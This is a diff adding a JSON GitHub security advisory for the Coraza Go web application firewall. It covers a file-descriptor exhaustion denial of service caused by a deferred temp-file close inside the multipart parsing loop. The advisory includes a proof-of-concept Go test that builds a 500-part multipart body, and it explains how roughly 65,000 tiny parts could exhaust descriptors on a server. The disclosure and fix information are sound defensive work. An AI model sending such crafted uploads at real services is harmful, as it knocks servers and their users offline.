@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-rp9v-7xv3-r6g3",
+  "modified": "2026-10-08T18:00:08.898267071Z",
+  "published": "2026-10-08T17:52:00Z",
+  "summary": "Coraza: Resource exhaustion via deferred file handle accumulation in multipart body processor",
+  "details": "## Summary\n\n`defer temp.Close()` sits inside a `for` loop in the multipart processor. Go defers run at function return, not loop end, so every file part in the request holds an open fd until `ProcessRequest()` exits. Send enough parts and you hit `EMFILE`. With CRS loaded, that flips `MULTIPART_STRICT_ERROR` to 1 and rule `200001` starts returning 400s, including on legitimate requests hitting the same condition.\n\n## Details\n\n`internal/bodyprocessors/multipart.go`, line 69:\n\n```go\nfor {\n    p, err := mr.NextPart()\n    // ...\n    temp, err := os.CreateTemp(storagePath, \"crzmp*\")\n    defer temp.Close() // wrong scope\n    io.Copy(temp, p)\n}\n```\n\nEach iteration opens a temp file and defers its close. All of them stack up and fire together when `ProcessRequest` returns. 500 parts, 500 fds held simultaneously.\n\nThe body size limit (default 128MB) caps total bytes, not part count. A minimal file part (boundary line, `Content-Disposition` with `filename=`, one byte of content) is about 104 bytes. That's roughly 65,000 parts per 6.8MB of body, which on a standard Linux system (hard fd limit 65536) is enough to exhaust the table.\n\nFix is straightforward: call `temp.Close()` explicitly after `io.Copy` instead of deferring it.\n\n## PoC\n\nTested on v3.7.0 (`db9850b`), Go 1.25, Linux x86_64.\n\nAdd this file at `internal/bodyprocessors/poc_fd_test.go` and run:\n\n```text\ngo test -v -run TestMultipartFDLeak ./internal/bodyprocessors/...\n```\n\n```go\npackage bodyprocessors_test\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"strings\"\n\t\"sync\"\n\t\"sync/atomic\"\n\t\"testing\"\n\n\t\"github.com/corazawaf/coraza/v3/experimental/plugins/plugintypes\"\n\t\"github.com/corazawaf/coraza/v3/internal/bodyprocessors\"\n\t\"github.com/corazawaf/coraza/v3/internal/corazawaf\"\n)\n\nfunc countFDs() int {\n\te, _ := os.ReadDir(\"/proc/self/fd\")\n\treturn len(e)\n}\n\nfunc TestMultipartFDLeak(t *testing.T) {\n\tboundary := \"testboundary\"\n\tvar sb strings.Builder\n\tfor i := 0; i \u003c 500; i++ {\n\t\tfmt.Fprintf(\u0026sb, \"--%s\\r\\n\", boundary)\n\t\tfmt.Fprintf(\u0026sb, \"Content-Disposition: form-data; name=\\\"f%d\\\"; filename=\\\"f%d.txt\\\"\\r\\n\", i, i)\n\t\tsb.WriteString(\"\\r\\n\")\n\t\tsb.WriteString(\"X\\r\\n\")\n\t}\n\tfmt.Fprintf(\u0026sb, \"--%s--\\r\\n\", boundary)\n\n\tmp, _ := bodyprocessors.GetBodyProcessor(\"multipart\")\n\tbaseline := countFDs()\n\n\tvar peak int64\n\tdone := make(chan struct{})\n\tvar wg sync.WaitGroup\n\twg.Add(1)\n\tgo func() {\n\t\tdefer wg.Done()\n\t\tfor {\n\t\t\tselect {\n\t\t\tcase \u003c-done:\n\t\t\t\treturn\n\t\t\tdefault:\n\t\t\t\tn := int64(countFDs())\n\t\t\t\tfor {\n\t\t\t\t\tcur := atomic.LoadInt64(\u0026peak)\n\t\t\t\t\tif n \u003c= cur || atomic.CompareAndSwapInt64(\u0026peak, cur, n) {\n\t\t\t\t\t\tbreak\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}()\n\n\tv := corazawaf.NewTransactionVariables()\n\tmp.ProcessRequest(strings.NewReader(sb.String()), v,\n\t\tplugintypes.BodyProcessorOptions{\n\t\t\tMime:        \"multipart/form-data; boundary=\" + boundary,\n\t\t\tStoragePath: t.TempDir(),\n\t\t})\n\tclose(done)\n\twg.Wait()\n\n\tt.Logf(\"baseline=%d  peak=%d  spike=+%d\",\n\t\tbaseline, atomic.LoadInt64(\u0026peak),\n\t\tatomic.LoadInt64(\u0026peak)-int64(baseline))\n}\n```\n\nOutput:\n\n```text\nbaseline=7  peak=506  spike=+499\n```\n\nThe spike is ~1 fd per part. After `ProcessRequest` returns the deferred closes fire and it drops back to baseline.\n\n## Impact\n\n- **No authentication required.** Any endpoint that accepts multipart uploads is affected.\n- **fd exhaustion at ~6.8MB body (~65k parts).** `os.CreateTemp` starts returning errors and `MULTIPART_STRICT_ERROR` is set to 1.\n- **CRS false positives / DoS.** With CRS loaded, rule `200001` then blocks the request with a 400 — and any other multipart request processed concurrently that runs into the same condition gets blocked too. At that point the WAF can't distinguish the attack from a legitimate upload.\n- **Process-wide impact.** While the fd table is full the process can't open sockets or files for anything else either.\n- **Scope.** Affects all v3.x releases; the `defer` has been present since the multipart processor was introduced.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/corazawaf/coraza/v3",
+        "purl": "pkg:golang/github.com/corazawaf/coraza/v3"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "3.0.0"
+            },
+            {
+              "fixed": "3.8.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-rp9v-7xv3-r6g3/GHSA-rp9v-7xv3-r6g3.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/corazawaf/coraza/security/advisories/GHSA-rp9v-7xv3-r6g3"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/corazawaf/coraza/commit/1bc39036e99c88e7de60cf8e6bb55ee4c311223c"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/corazawaf/coraza"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/corazawaf/coraza/releases/tag/v3.8.0"
+    }
+  ]
+}
